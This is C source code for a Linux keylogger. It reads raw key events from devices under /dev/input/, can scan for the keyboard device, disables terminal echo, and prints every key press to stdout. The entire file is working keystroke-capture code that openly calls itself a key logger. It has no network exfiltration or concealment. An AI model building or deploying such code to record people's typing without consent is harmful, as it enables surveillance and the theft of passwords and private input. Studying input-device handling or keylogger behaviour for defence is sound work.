
/** Event interface key logger 
  *
  * Records all keystrokes from the event
  * devices in /dev/input/
  *
  * The event interface must be enabled and
  * the keyboard must be in raw scancode
  * mode
  *
  * Eddie Bell - ejlbell@gmail.com
  *
  * Thanks to Shibiao - slin [at] cs.sunysbi [dot] edu
  * for fixing a flaw that prevented some charaters
  * from being printed
  *
  */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>

#define PATH "/dev/input/"

#define PROBE_FAILED -1
#define PROBE_NO_RESPONSE 0
#define PROBE_MATCH 1

#define ECHO_OFF 0
#define ECHO_ON 1

#define DEVICE_NAME_LEN 1024

/*
 * Disables and enable terminal echoing
 */

void
echoctl (int type)
{
  static struct termios tc;
  static struct termios ots;

  if (type == ECHO_OFF) {
    // save current settings
    tcgetattr (STDIN_FILENO, &tc);
    ots = tc;
    // disable echo
    tc.c_lflag &= ~ECHO;
    tc.c_lflag |= ECHONL;
    tcsetattr (STDIN_FILENO, TCSAFLUSH, &tc);
  } else {
      // enable echo
      tcsetattr (STDIN_FILENO, TCSAFLUSH, &ots);
  }
}

void
handler (int sig) {
  echoctl (ECHO_ON);
  printf ("\nexiting...(%d)\n", sig);
  exit (0);
}

void
perror_exit (char *error) {
  perror (error);
  handler (9);
}

/*
 * Process the raw scancodes 
 */

int read_keys (int fd) {
    struct input_event ev[64];
    int value, size = sizeof (struct input_event);

    if ((read (fd, ev, size * 64)) < size)
        perror_exit ("read_key: read()");

    // Only read the key press event, NOT the key release event
    if (ev[1].value == 1 && ev[1].type == 1) 
        return ev[0].value;
    return -1;
}

/*
* check if a device responds to keyboard input
*/

int test_device (char *device_name) {
    int fd, results;
    char test_input[16];
    fd_set rfds;

    // open device
    if ((fd = open (device_name, O_RDONLY | O_NONBLOCK)) < 0)
        return PROBE_FAILED;

    getchar ();
    // check if device has outputted the data
    // a bit of a fuzzy match
    results = read (fd, test_input, 16);
    close(fd);

    if(results > 0) 
        return PROBE_MATCH;
    else
	    return PROBE_NO_RESPONSE;
}

/*
 *  Check each device in /dev/input and determine if
 *  it is a keyboard device
 */

char *scan_for_devices (char *device_name) {
    DIR *event_devices = opendir (PATH);
    struct dirent *dir = NULL;
    int found = PROBE_NO_RESPONSE;

    if(device_name == NULL) {
        printf ("Device name buffer is NULL\n");
        exit(1);
    }

    if (event_devices == NULL) {
      printf ("Cannot open the event interface directory (%s)\n", PATH);
      perror_exit ("opendir()");
    }

    printf ("scanning for devices in %s\n\n", PATH);
    printf ("* NOTE: Please hold down the enter key to provide test data *\n");
    getchar ();

    while ((dir = readdir (event_devices)) != NULL && (found != PROBE_MATCH)) {

        // ignore this and parent directory
        if ((strncmp (dir->d_name, ".", 1)) == 0) 
            continue;

       	  snprintf(device_name, 1024, "%s%s", PATH, dir->d_name);
	      printf("\ttrying %s", dir->d_name);
    	  found = test_device(device_name);
    }

    if (found == PROBE_MATCH)
        return device_name;
    else
        return NULL;
}

int main (int argc, char *argv[]) {
    char device[DEVICE_NAME_LEN];
    int fd = -1;

    if (argv[1] == NULL) {
        printf("Please specify the path to the dev event interface device\n");
        printf("If you do not know which device to specify, use the argument 'scan'\n");
        exit (0);
    }

    if ((getuid ()) != 0)
        printf ("You are not root! This may not work...\n");

    echoctl (ECHO_OFF);

    if ((strncmp (argv[1], "scan", 4)) == 0) {
        if (scan_for_devices(device) == NULL) {
            echoctl(ECHO_ON);
            printf ("Cannot find event device. Are you sure the event device is enabled?\n");
            exit(EXIT_FAILURE);
        }
    } else {
        strncpy(device, argv[1], DEVICE_NAME_LEN);
    }

    if ((fd = open (device, O_RDONLY)) == -1) {
        echoctl(ECHO_ON);
        printf ("%s is not a vaild device. try using the argument 'scan'\n", device);
        exit(EXIT_FAILURE);
    }

    char name[256] = "unknown";
    ioctl (fd, EVIOCGNAME (sizeof (name)), name);
    printf("reading from %s (%s)\n", device, name);

    signal (SIGINT, &handler);
    signal (SIGKILL, &handler);
    signal (SIGQUIT, &handler);

    int key_press = -1;

    while(1) {
        if((key_press = read_keys (fd)) == -1)
            continue;
        printf ("%d\n", key_press);
        fflush (stdout);
    }

    return 0;
}
